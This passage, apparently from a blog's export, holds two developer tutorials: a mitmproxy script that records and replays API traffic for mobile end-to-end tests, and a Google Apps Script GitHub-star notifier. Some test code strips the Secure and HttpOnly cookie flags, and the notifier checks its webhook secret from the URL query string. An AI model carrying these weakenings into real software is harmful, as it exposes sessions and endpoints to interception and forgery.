areas.End-to-End Testing ‚Äî Technical ChallengesUI Operation IssuesThe app works more like using another test app to operate the app under test, then locating target objects through the View Hierarchy. During testing, it cannot access the logs or output of the app under test because they are essentially two different apps.iOS needs to improve View Accessibility Identifiers to enhance efficiency and accuracy, and also handle Alerts (e.g., push notification requests).Android previously had issues finding target objects when mixing Compose with Fragments, but according to a teammate, the latest Compose version has resolved this.In addition to the common traditional issues, a bigger problem is the difficulty in integrating dual platforms (writing one test to run on both). Currently, we are trying new testing tools mobile-dev-inc / maestro:You can write a Test Plan using YAML and run tests on both platforms. Details on usage and trial experience will be shared by another teammate soon, cc‚Äôed Alejandra Ts. üòù.API Data IssuesThe biggest variable in App E2E Testing is the API data. Without guaranteed consistent data, test instability increases, causing false positives and ultimately leading to a loss of confidence in the Test Plan.For example, when testing the checkout process, if a product might be removed or disappear, and these status changes are not controlled by the app, the above issues are likely to occur.There are many ways to solve data issues, such as creating clean Staging or Testing environments, or using Open API-based Auto-Gen Mock API Servers. However, these methods rely on the backend and external API factors. Since the backend API, like the app, has been running online for many years and some specifications are still being restructured and migrated, a Mock Server is temporarily not available.Based on the above factors, if you get stuck here, the problem will remain unchanged, and the chicken-and-egg dilemma cannot be resolved. The only option is to ‚Äútake the risk‚Äù by making changes first and dealing with issues as they arise.Snapshot API Local Mock Server ‚ÄúAs long as the mindset doesn‚Äôt decline, there are always more methods than difficulties.‚ÄùWe can consider a different approach. If the UI can be captured as snapshots for replay and validation testing, can the API do the same? Can we save API requests and responses to replay them later for validation testing?Introducing the main focus of this article: Building a ‚ÄúSnapshot API Local Mock Server‚Äù to Record API Requests &amp; Replay Responses, separating dependency on API data. This article only presents a POC concept verification and has not fully implemented high-coverage End To End Testing. Therefore, the approach is for reference only, and we hope it inspires new ideas within your current environment.Snapshot API Local Mock ServerCore Concept ‚Äî Record &amp; Replay API Data[Record] ‚Äî After completing the development of the End-to-End Testing Test Case, open the recording parameters and run a test once. All API Requests &amp; Responses during the process will be saved in each Test Case directory.[Replay] ‚Äî During the Test Case run, find the corresponding recorded Response Data from the Test Case directory based on the request to complete the test process.IllustrationAssuming we want to test the purchase process: after the user opens the app, they click the product card on the home page to enter the product detail page, press the purchase button at the bottom, a login box pops up to complete login, complete the purchase, and a purchase success message appears:UI Testing on controlling button clicks, input fields, etc., is not the main focus of this article; you can refer to existing testing frameworks for direct use.Regular Proxy or Reverse ProxyTo achieve Record &amp; Replay API, a proxy must be placed between the app and the API to perform a man-in-the-middle attack. You can refer to my earlier article ‚ÄúAPP uses HTTPS transmission, but data was still stolen.‚ÄùSimply put, it is an intermediary that passes messages between the App and the API. Like passing notes, all requests and responses between both sides go through it. It can read the contents of the notes or even forge them without either side noticing the interference.Regular Proxy:A forward proxy is when the client sends a request to the proxy server, which then forwards the request to the target server and returns the target server‚Äôs response to the client. In forward proxy mode, the proxy server initiates the request on behalf of the client. The client must explicitly specify the proxy server‚Äôs address and port number and send the request to the proxy server.Reverse Proxy:A reverse proxy is the opposite of a forward proxy; it sits between the target server and the client. The client sends requests to the reverse proxy server, which forwards the requests to the backend target server based on certain rules and returns the target server‚Äôs response to the client. To the client, the target server appears as the reverse proxy server, and the client does not need to know the real address of the target server.For our needs, both forward and reverse can achieve the goal. The only thing to consider is the method of proxy setup:A forward proxy requires setting up a proxy on the computer, phone, or emulator network settings: Android can individually set Proxy in the emulator directly The iOS Simulator shares the computer‚Äôs network environment and cannot have a separate Proxy set up. This means you must change the computer‚Äôs settings to enable the Proxy. All traffic from the computer will go through this Proxy, and if you run other network tools like Proxyman or Charles simultaneously, they may forcibly change the Proxy settings to their own, causing the Proxy to fail. Reverse proxy requires changing the API Host in the Codebase and declaring all API Domains to be proxied: The API Host in the codebase should be replaced with the Proxy Server IP during testing. Which domains should be declared to use the proxy when enabling Reverse Proxy? Only declared domains will go through the proxy; undeclared ones will connect directly. In conjunction with the iOS App, the following is a POC example using iOS &amp; Reverse Proxy. The same applies to Android.Let the iOS App Know It Is Running End-to-End Testing NowWe need to let the app know that it is currently running End-to-End Testing so that we can add API Host replacement logic in the app code:// UI Testing Target:let app = XCUIApplication()app.launchArguments = [\"duringE2ETesting\"]app.launch()We perform judgment and replacement at the Network layer. This adjustment is unavoidable; try not to change the app‚Äôs code just for testing purposes.Using MITMProxy to Implement a Reverse Proxy Server You can also develop a Swift Server using Swift yourself. This article is just a POC, so it directly uses the MITMProxy tool.[2023‚Äì09‚Äì04 Update] Mitmproxy-rodo is now open sourceThe following implementation has been open-sourced in the mitmproxy-rodo project. Feel free to check it out for reference.Some structure and content of this article have been adjusted; further adjustments were made after open-sourcing: Save the directory structure as host / requestPath / method / hash Fix Header information storage: it should be Bytes Data instead of plain JSON String Correct some errors Add automatic extension for Set-Cookie expiration time function ‚ö†Ô∏è The following script is for demo reference only. Future script adjustments will be maintained in the open-source project. ‚ö†Ô∏è The following script is for demo reference only. Future script adjustments will be maintained in the open-source project. ‚ö†Ô∏è The following script is for demo reference only. Future script adjustments will be maintained in an open-source project. ‚ö†Ô∏è The following script is for demo reference only. Future script updates will be maintained in an open-source project. ‚ö†Ô∏è The following script is for demo reference only. Future script adjustments will be maintained in an open-source project.MITMProxyFollow the MITMProxy official website to complete the installation:brew install mitmproxyFor detailed usage of MITMProxy, please refer to my earlier article ‚ÄúAPP uses HTTPS for transmission, but data was still stolen.‚Äù mitmproxy provides an interactive command-line interface. mitmweb provides a browser-based graphical user interface. mitmdump provides non-interactive terminal output. Implement Record &amp; ReplaySince MITMProxy Reverse Proxy does not natively support recording (or dumping) requests and mapping request replay, we need to write scripts to implement this functionality ourselves.mock.py :\"\"\"Example: Record: mitmdump -m reverse:https://yourapihost.com -s mock.py --set record=true --set dumper_folder=loginFlow --set config_file=config.json Replay: mitmdump -m reverse:https://yourapihost.com -s mock.py --set dumper_folder=loginFlow --set config_file=config.json\"\"\"import reimport loggingimport mimetypesimport osimport jsonimport hashlibfrom pathlib import Pathfrom mitmproxy import ctxfrom mitmproxy import httpclass MockServerHandler: def load(self, loader): self.readHistory = {} self.configuration = {} loader.add_option( name=\"dumper_folder\", typespec=str, default=\"dump\", help=\"Response Dump directory, can be created by Test Case Name\", ) loader.add_option( name=\"network_restricted\", typespec=bool, default=True, help=\"If no local mapping data... set true to return 404, false to make real requests to get data.\", ) loader.add_option( name=\"record\", typespec=bool, default=False, help=\"Set true to record Request's Response\", ) loader.add_option( name=\"config_file\", typespec=str, default=\"\", help=\"Set file path, example file below\", ) def configure(self, updated): self.loadConfig() def loadConfig(self): configFile = Path(ctx.options.config_file) if ctx.options.config_file == \"\" or not configFile.exists(): return self.configuration = json.loads(open(configFile, \"r\").read()) def hash(self, request): query = request.query requestPath = \"-\".join(request.path_components) ignoredQueryParameterByPaths = self.configuration.get(\"ignored\", {}).get(\"paths\", {}).get(request.host, {}).get(requestPath, {}).get(request.method, {}).get(\"queryParamters\", []) ignoredQueryParameterGlobal = self.configuration.get(\"ignored\", {}).get(\"global\", {}).get(\"queryParamters\", []) filteredQuery = [] if query: filteredQuery = [(key, value) for key, value in query.items() if key not in ignoredQueryParameterByPaths + ignoredQueryParameterGlobal] formData = [] if request.get_content() != None and request.get_content() != b'': formData = json.loads(request.get_content()) # or just formData = request.urlencoded_form # or just formData = request.multipart_form # depends on your api design ignoredFormDataParametersByPaths = self.configuration.get(\"ignored\", {}).get(\"paths\", {}).get(request.host, {}).get(requestPath, {}).get(request.method, {}).get(\"formDataParameters\", []) ignoredFormDataParametersGlobal = self.configuration.get(\"ignored\", {}).get(\"global\", {}).get(\"formDataParameters\", []) filteredFormData = [] if formData: filteredFormData = [(key, value) for key, value in formData.items() if key not in ignoredFormDataParametersByPaths + ignoredFormDataParametersGlobal] # Serialize the dictionary to a JSON string hashData = {\"query\":sorted(filteredQuery), \"form\": sorted(filteredFormData)} json_str = json.dumps(hashData, sort_keys=True) # Apply SHA-256 hash function hash_object = hashlib.sha256(json_str.encode()) hash_string = hash_object.hexdigest() return hash_string def readFromFile(self, request): host = request.host method = request.method hash = self.hash(request) requestPath = \"-\".join(request.path_components) folder = Path(ctx.options.dumper_folder) / host / method / requestPath / hash if not folder.exists(): return None content_type = request.headers.get(\"content-type\", \"\").split(\";\")[0] ext = mimetypes.guess_extension(content_type) or \".json\" count = self.readHistory.get(host, {}).get(method, {}).get(requestPath, {}) or 0 filepath = folder / f\"Content-{str(count)}{ext}\" while not filepath.exists() and count &gt; 0: count = count - 1 filepath = folder / f\"Content-{str(count)}{ext}\" if self.readHistory.get(host) is None: self.readHistory[host] = {} if self.readHistory.get(host).get(method) is None: self.readHistory[host][method] = {} if self.readHistory.get(host).get(method).get(requestPath) is None: self.readHistory[host][method][requestPath] = {} if filepath.exists(): headerFilePath = folder / f\"Header-{str(count)}.json\" if not headerFilePath.exists(): headerFilePath = None count += 1 self.readHistory[host][method][requestPath] = count return {\"content\": filepath, \"header\": headerFilePath} else: return None def saveToFile(self, request, response): host = request.host method = request.method hash = self.hash(request) requestPath = \"-\".join(request.path_components) iterable = self.configuration.get(\"ignored\", {}).get(\"paths\", {}).get(request.host, {}).get(requestPath, {}).get(request.method, {}).get(\"iterable\", False) folder = Path(ctx.options.dumper_folder) / host / method / requestPath / hash # create dir if not exists if not folder.exists(): os.makedirs(folder) content_type = response.headers.get(\"content-type\", \"\").split(\";\")[0] ext = mimetypes.guess_extension(content_type) or \".json\" repeatNumber = 0 filepath = folder / f\"Content-{str(repeatNumber)}{ext}\" while filepath.exists() and iterable == False: repeatNumber += 1 filepath = folder / f\"Content-{str(repeatNumber)}{ext}\" # dump to file with open(filepath, \"wb\") as f: f.write(response.content or b'') headerFilepath = folder / f\"Header-{str(repeatNumber)}.json\" with open(headerFilepath, \"wb\") as f: responseDict = dict(response.headers.items()) responseDict['_status_code'] = response.status_code f.write(json.dumps(responseDict).encode('utf-8')) return {\"content\": filepath, \"header\": headerFilepath} def request(self, flow): if ctx.options.record != True: host = flow.request.host path = flow.request.path result = self.readFromFile(flow.request) if result is not None: content = b'' headers = {} statusCode = 200 if result.get('content') is not None: content = open(result['content'], \"r\").read() if result.get('header') is not None: headers = json.loads(open(result['header'], \"r\").read()) statusCode = headers['_status_code'] del headers['_status_code'] headers['_responseFromMitmproxy'] = '1' flow.response = http.Response.make(statusCode, content, headers) logging.info(\"Fulfill response from local with \"+str(result['content'])) return if ctx.options.network_restricted == True: flow.response = http.Response.make(404, b'', {'_responseFromMitmproxy': '1'}) def response(self, flow): if ctx.options.record == True and flow.response.headers.get('_responseFromMitmproxy') != '1': result = self.saveToFile(flow.request, flow.response) logging.info(\"Save response to local with \"+str(result['content']))addons = [MockServerHandler()]You can refer to the official documentation and adjust the script content according to your needs.The script design logic is as follows: File path logic: dumper_folder(a.k.a Test Case Name) / Reverse's api host / HTTP Method / Path joined with - (e.g. app/launch -&gt; app-launch) / Hash(Get Query &amp; Post Content) / File logic: Response content: Content-0.xxx, Content-1.xxx (second request for the same one)‚Ä¶ and so on; Response header info: Header-0.json (same logic as Content-x) When saving, files are stored sequentially according to the path and file logic; during Replay, they are retrieved in the same order. If the number of times does not match, for example, during Replay the same path is called 3 times, but the recorded data only stores up to the 2nd time; it will continue to respond with the result of the 2nd time, which is the last recorded result. When record is True, it sends a request to the target server, gets the response, and saves it according to the above logic; when False, it only reads data locally (equivalent to Replay Mode). When network_restricted is False, if there is no local Mapping data, it will directly respond with 404; when it is True, it will fetch data from the target Server. _responseFromMitmproxy is used to inform the Response Method that the current response comes from Local and can be ignored. _status_code uses the Header.json field to store the HTTP Response status code. config_file.json configuration file logic design is as follows:{ \"ignored\": { \"paths\": { \"yourapihost.com\": { \"add-to-cart\": { \"POST\": { \"queryParamters\": [ \"created_timestamp\" ], \"formDataParameters\": [] } }, \"api-status-checker\": { \"GET\": { \"iterable\": true } } } }, \"global\": { \"queryParamters\": [ \"timestamp\" ], \"formDataParameters\": [] } }}queryParamters &amp; formDataParameters :Some API parameters may change with each call, such as time parameters in certain endpoints. According to the server design, the value of Hash(Query Parameter &amp; Body Content) will differ during Replay Request, causing failure to map to the Local Response. To handle this, an additional config.json was created. It allows excluding specific parameters from the hash calculation by Endpoint Path or globally, ensuring consistent mapping results.iterable :Since some polling check APIs may repeatedly call at regular intervals, the server design generates many Content-x.xxx &amp; Header-x.json files; however, if we don‚Äôt mind, we can set it to True, and the response will continuously save and overwrite the first files Content-0.xxx &amp; Header-0.json.Enable Reverse Proxy Record Mode:mitmdump -m reverse:https://yourapihost.com -s mock.py --set record=true --set dumper_folder=loginFlow --set config_file=config.jsonEnable Reverse Proxy Replay Mode:mitmdump -m reverse:https://yourapihost.com -s mock.py --set dumper_folder=loginFlow --set config_file=config.jsonAssembly &amp; Proof Of Concept0. Replace Hosts in the CodebaseMake sure that during testing, the API has been changed to http://127.0.0.1:80801. Start Snapshot API Local Mock Server (a.k.a Reverse Proxy Server) Record Modemitmdump -m reverse:https://yourapihost.com -s mock.py --set record=true --set dumper_folder=addCart --set config_file=config.json2. Perform E2E Testing UI OperationsUsing Pinkoi iOS App as an example, test the following process: Launch App -&gt; Home -&gt; Scroll Down -&gt; Similar to Wish List Items Section -&gt; First Product -&gt; Click First Product -&gt; Enter Product Page -&gt; Click Add to Cart -&gt; UI Response Added to Cart -&gt; Test Successful ‚úÖThe UI automation method was mentioned earlier. Here, we first manually test the same process to verify the results.3. Get Record ResultsAfter completing the operation, press ^ + C to stop the Snapshot API Mock Server, then check the recording results in the file directory:4. Replay Verification of the Same Process, Start Server &amp; Using Replay Modemitmdump -m reverse:https://yourapihost.com -s mock.py --set dumper_folder=addCart --set config_file=config.json5. Execute the previous UI operation again to verify the results Left: Test Successful ‚úÖ Right: Test clicking on products other than the recorded ones. An error will appear (because there is no local data + network_restricted is set to False by default, no local data will directly return 404 and will not fetch data from the network). 6. Proof Of Concept ‚úÖProof of concept succeeded. We can indeed implement a Reverse Proxy Server to store API requests and responses ourselves, and use it as a Mock API Server to respond to the app during testing üéâüéâüéâ.[2023‚Äì09‚Äì04] mitmproxy-rodo Open SourcedFollow-up and Miscellaneous NotesThis article only discusses the proof of concept; there are many areas to improve and more features to implement in the future. Integration with maestro UI Testing tool CI/CD Pipeline Integration Design (How to Automatically Start Reverse Proxy? Where to Start It?) How to Embed MITMProxy into a Development Tool? Verify More Complex Test Scenarios For validating the sent Tracking Request, you need to implement storing the Request Body and then extract which Tracking Event Data were sent and whether the events conform to the required process Cookie Issues#... def response(self, flow): setCookies = flow.response.headers.get_all(\"set-cookie\") # setCookies = ['ad=0; Domain=.xxx.com; expires=Wed, 23 Aug 2023 04:59:07 GMT; Max-Age=1800; Path=/', 'sessionid=xxxx; Secure; HttpOnly; Domain=.xxx.com; expires=Wed, 23 Aug 2023 04:59:07 GMT; Max-Age=1800; Path=/'] # OR Replace Cookie Domain From .xxx.com To 127.0.0.1 setCookies = [re.sub(r\"\\s*\\.xxx\\.com\\s*\", \"127.0.0.1\", s) for s in setCookies] # AND Remove security-related restrictions setCookies = [re.sub(r\";\\s*Secure\\s*\", \"\", s) for s in setCookies] setCookies = [re.sub(r\";\\s*HttpOnly;\\s*\", \"\", s) for s in setCookies] flow.response.headers.set_all(\"Set-Cookie\", setCookies) #...If you encounter cookie-related issues, such as the API returning cookies but the app not receiving them, refer to the adjustments mentioned above.The Last Article on PinkoiIn over 900 days at Pinkoi, I realized many of my career and iOS/App development and process ideas. Thanks to all my teammates for going through the pandemic and challenges together; the courage to say goodbye is like the courage I had when I first pursued my dream job. Setting sail to find new life challenges (including but not limited to engineering). If you have suitable opportunities (iOS or engineering management or startup products), please feel free to contact me. üôèüôèüôèIf you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Google Apps ScriptÔΩú3-Step Guide to Build Free Github Repo Star Notifier", "url": "/posts/zrealm-dev/google-apps-script-3-step-guide-to-build-free-github-repo-star-notifier-382218e15697/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, google-apps-script, github, notifications, stars", "date": "2023-08-01 22:32:14 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Create a Github Repo Star Notifier for Free in Three Steps Using Google Apps S...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Create a Github Repo Star Notifier for Free in Three Steps Using Google Apps ScriptWriting GAS to Connect Github Webhook and Forward Star Like Notifications to LinePrefaceAs an open-source project maintainer, not for money or fame, but for a sense of vanity; every time I see a new ‚≠êÔ∏è star, I feel secretly delighted; spending time and effort on a project that people actually use and that truly helps friends with the same problems.Star History ChartTherefore, I have a bit of an obsession with watching ‚≠êÔ∏è stars and often check Github to see if the ‚≠êÔ∏è star count has increased. I wondered if there was a more proactive way to get notified immediately when someone clicks the ‚≠êÔ∏è star, without having to manually track or check.Existing ToolsFirst, consider finding existing tools to achieve this. I searched on Github Marketplace and found several well-made tools by experts that can be used.Tried a few of them, but the results were disappointing. Some no longer work, some only send notifications every 5/10/20 ‚≠êÔ∏è stars (I‚Äôm just a small user, so even 1 new ‚≠êÔ∏è makes me happy üòù), and notifications can only be sent via email, but I want to use SNS notifications.Also, installing an app just for ‚Äúvanity‚Äù feels uneasy, as there are concerns about potential security risks.On iOS, the Github app and third-party apps like GitTrends do not support this feature.Build Your Own Github Repo Star NotifierBased on the above, we can actually use Google Apps Script to quickly and freely create our own Github Repo Star Notifier.2024/10/12 Update ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è Since Line Notify will be shut down on 2025/04/01, please refer to my latest article ‚ÄúQuickly migrate Line Notify to Telegram Bot notifications in 10 minutes‚Äú to switch to Telegram notification integration.Preparation WorkThis article uses Line as the notification medium. If you want to use other messaging apps for notifications, you can ask ChatGPT how to implement it.Ask ChatGPT how to implement Line NotifylineToken Ôºö Go to Line Notify After logging into your Line account, scroll down to find the ‚ÄúGenerate access token (For developers)‚Äù section. Click ‚ÄúGenerate token‚Äù Token Name: Enter the desired bot title to display before the message (e.g. Github Repo Notifier: XXXX) Choose where to send the message: I selected 1-on-1 chat with LINE Notify to send the message to myself via the official LINE Notify bot. Click ‚ÄúGenerate token‚Äù Select ‚ÄúCopy‚Äù And record the Token, as it cannot be viewed again and must be regenerated if forgotten later. githubWebhookSecret Ôºö Go to Random.org to generate a random string. Copy &amp; Note down this random stringWe will use this string as the request verification medium between Github Webhook and Google Apps Script. Due to GAS limitations, it is not possible to get Headers content in doPost(e). Therefore, the standard Github Webhook authentication method cannot be used, and string matching verification must be done manually using the ?secret= query.Create Google Apps ScriptGo to Google Apps Script, and click the ‚Äú+ New Project‚Äù button at the top left.Google Apps ScriptClick the top left ‚ÄúUntitled Project‚Äù to rename the project.Here, I named the project My-Github-Repo-Notifier for easy identification in the future.Code Input Area:// Constant variablesconst lineToken = 'XXXX';// Generate your line notify bot token: https://notify-bot.line.me/my/const githubWebhookSecret = \"XXXXX\";// Generate your secret string here: https://www.random.org/strings/?num=1&amp;len=32&amp;digits=on&amp;upperalpha=on&amp;loweralpha=on&amp;unique=on&amp;format=html&amp;rnd=new// HTTP Get/Post Handler// GET method is not allowedfunction doGet(e) { return HtmlService.createHtmlOutput(\"Access Denied!\");}// Github Webhook uses POST methodfunction doPost(e) { const content = JSON.parse(e.postData.contents); // Security check to ensure the request is from Github Webhook if (verifyGitHubWebhook(e) == false) { return HtmlService.createHtmlOutput(\"Access Denied!\"); } // star payload data content[\"action\"] == \"started\" if(content[\"action\"] != \"started\") { return HtmlService.createHtmlOutput(\"OK!\"); } // Compose message const message = makeMessageString(content); // Send message, can be changed to Slack, Telegram... sendLineNotifyMessage(message); return HtmlService.createHtmlOutput(\"OK!\");}// Method// Generate message contentfunction makeMessageString(content) { const repository = content[\"repository\"]; const repositoryName = repository[\"name\"]; const repositoryURL = repository[\"svn_url\"]; const starsCount = repository[\"stargazers_count\"]; const forksCount = repository[\"forks_count\"]; const starrer = content[\"sender\"][\"login\"]; var message = \"üéâüéâ \\\"\"+starrer+\"\\\" starred your \\\"\"+repositoryName+\"\\\" Repo üéâüéâ\\n\"; message += \"Current total stars: \"+starsCount+\"\\n\"; message += \"Current total forks: \"+forksCount+\"\\n\"; message += repositoryURL; return message;}// Verify if the request is from Github Webhook// Due to GAS limitations (https://issuetracker.google.com/issues/67764685?pli=1)// Unable to get Headers content// Therefore cannot use Github Webhook standard verification method (https://docs.github.com/en/webhooks-and-events/webhooks/securing-your-webhooks)// Can only manually match using ?secret=XXXfunction verifyGitHubWebhook(e) { if (e.parameter[\"secret\"] === githubWebhookSecret) { return true } else { return false }}// -- Send Message --// Line// For other message sending methods, ask ChatGPTfunction sendLineNotifyMessage(message) { var url = 'https://notify-api.line.me/api/notify'; var options = { method: 'post', headers: { 'Authorization': 'Bearer '+lineToken }, payload: { 'message': message } }; UrlFetchApp.fetch(url, options);}lineToken &amp; githubWebhookSecret with the values copied from the previous step.Additional Github Webhook data received when someone presses Star:{ \"action\": \"created\", \"starred_at\": \"2023-08-01T03:42:26Z\", \"repository\": { \"id\": 602927147, \"node_id\": \"R_kgDOI-_wKw\", \"name\": \"ZMarkupParser\", \"full_name\": \"ZhgChgLi/ZMarkupParser\", \"private\": false, \"owner\": { \"login\": \"ZhgChgLi\", \"id\": 83232222, \"node_id\": \"MDEyOk9yZ2FuaXphdGlvbjgzMjMyMjIy\", \"avatar_url\": \"https://avatars.githubusercontent.com/u/83232222?v=4\", \"gravatar_id\": \"\", \"url\": \"https://api.github.com/users/ZhgChgLi\", \"html_url\": \"https://github.com/ZhgChgLi\", \"followers_url\": \"https://api.github.com/users/ZhgChgLi/followers\", \"following_url\": \"https://api.github.com/users/ZhgChgLi/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/ZhgChgLi/gists{/gist_id}\", \"starred_url\": \"https://api.github.com/users/ZhgChgLi/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/ZhgChgLi/subscriptions\", \"organizations_url\": \"https://api.github.com/users/ZhgChgLi/orgs\", \"repos_url\": \"https://api.github.com/users/ZhgChgLi/repos\", \"events_url\": \"https://api.github.com/users/ZhgChgLi/events{/privacy}\", \"received_events_url\": \"https://api.github.com/users/ZhgChgLi/received_events\", \"type\": \"Organization\", \"site_admin\": false }, \"html_url\": \"https://github.com/ZhgChgLi/ZMarkupParser\", \"description\": \"ZMarkupParser is a pure-Swift library that helps you convert HTML strings into NSAttributedString with customized styles and tags.\", \"fork\": false, \"url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser\", \"forks_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/forks\", \"keys_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/keys{/key_id}\", \"collaborators_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/collaborators{/collaborator}\", \"teams_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/teams\", \"hooks_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/hooks\", \"issue_events_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/issues/events{/number}\", \"events_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/events\", \"assignees_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/assignees{/user}\", \"branches_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/branches{/branch}\", \"tags_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/tags\", \"blobs_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/git/blobs{/sha}\", \"git_tags_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/git/tags{/sha}\", \"git_refs_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/git/refs{/sha}\", \"trees_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/git/trees{/sha}\", \"statuses_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/statuses/{sha}\", \"languages_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/languages\", \"stargazers_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/stargazers\", \"contributors_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/contributors\", \"subscribers_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/subscribers\", \"subscription_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/subscription\", \"commits_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/commits{/sha}\", \"git_commits_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/git/commits{/sha}\", \"comments_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/comments{/number}\", \"issue_comment_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/issues/comments{/number}\", \"contents_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/contents/{+path}\", \"compare_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/compare/{base}...{head}\", \"merges_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/merges\", \"archive_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/{archive_format}{/ref}\", \"downloads_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/downloads\", \"issues_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/issues{/number}\", \"pulls_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/pulls{/number}\", \"milestones_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/milestones{/number}\", \"notifications_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/notifications{?since,all,participating}\", \"labels_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/labels{/name}\", \"releases_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/releases{/id}\", \"deployments_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/deployments\", \"created_at\": \"2023-02-17T08:41:37Z\", \"updated_at\": \"2023-08-01T03:42:27Z\", \"pushed_at\": \"2023-08-01T00:07:41Z\", \"git_url\": \"git://github.com/ZhgChgLi/ZMarkupParser.git\", \"ssh_url\": \"git@github.com:ZhgChgLi/ZMarkupParser.git\", \"clone_url\": \"https://github.com/ZhgChgLi/ZMarkupParser.git\", \"svn_url\": \"https://github.com/ZhgChgLi/ZMarkupParser\", \"homepage\": \"https://zhgchg.li\", \"size\": 27449, \"stargazers_count\": 187, \"watchers_count\": 187, \"language\": \"Swift\", \"has_issues\": true, \"has_projects\": true, \"has_downloads\": true, \"has_wiki\": true, \"has_pages\": false, \"has_discussions\": false, \"forks_count\": 10, \"mirror_url\": null, \"archived\": false, \"disabled\": false, \"open_issues_count\": 2, \"license\": { \"key\": \"mit\", \"name\": \"MIT License\", \"spdx_id\": \"MIT\", \"url\": \"https://api.github.com/licenses/mit\", \"node_id\": \"MDc6TGljZW5zZTEz\" }, \"allow_forking\": true, \"is_template\": false, \"web_commit_signoff_required\": false, \"topics\": [ \"cocoapods\", \"html\", \"html-converter\", \"html-parser\", \"html-renderer\", \"ios\", \"nsattributedstring\", \"swift\", \"swift-package\", \"textfield\", \"uikit\", \"uilabel\", \"uitextview\" ], \"visibility\": \"public\", \"forks\": 10, \"open_issues\": 2, \"watchers\": 187, \"default_branch\": \"main\" }, \"organization\": { \"login\": \"ZhgChgLi\", \"id\": 83232222, \"node_id\": \"MDEyOk9yZ2FuaXphdGlvbjgzMjMyMjIy\", \"url\": \"https://api.github.com/orgs/ZhgChgLi\", \"repos_url\": \"https://api.github.com/orgs/ZhgChgLi/repos\", \"events_url\": \"https://api.github.com/orgs/ZhgChgLi/events\", \"hooks_url\": \"https://api.github.com/orgs/ZhgChgLi/hooks\", \"issues_url\": \"https://api.github.com/orgs/ZhgChgLi/issues\", \"members_url\": \"https://api.github.com/orgs/ZhgChgLi/members{/member}\", \"public_members_url\": \"https://api.github.com/orgs/ZhgChgLi/public_members{/member}\", \"avatar_url\": \"https://avatars.githubusercontent.com/u/83232222?v=4\", \"description\": \"Building a Better World Together.\" }, \"sender\": { \"login\": \"zhgtest\", \"id\": 4601621, \"node_id\": \"MDQ6VXNlcjQ2MDE2MjE=\", \"avatar_url\": \"https://avatars.githubusercontent.com/u/4601621?v=4\", \"gravatar_id\": \"\", \"url\": \"https://api.github.com/users/zhgtest\", \"html_url\": \"https://github.com/zhgtest\", \"followers_url\": \"https://api.github.com/users/zhgtest/followers\", \"following_url\": \"https://api.github.com/users/zhgtest/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/zhgtest/gists{/gist_id}\", \"starred_url\": \"https://api.github.com/users/zhgtest/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/zhgtest/subscriptions\", \"organizations_url\": \"https://api.github.com/users/zhgtest/orgs\", \"repos_url\": \"https://api.github.com/users/zhgtest/repos\", \"events_url\": \"https://api.github.com/users/zhgtest/events{/privacy}\", \"received_events_url\": \"https://api.github.com/users/zhgtest/received_events\", \"type\": \"User\", \"site_admin\": false 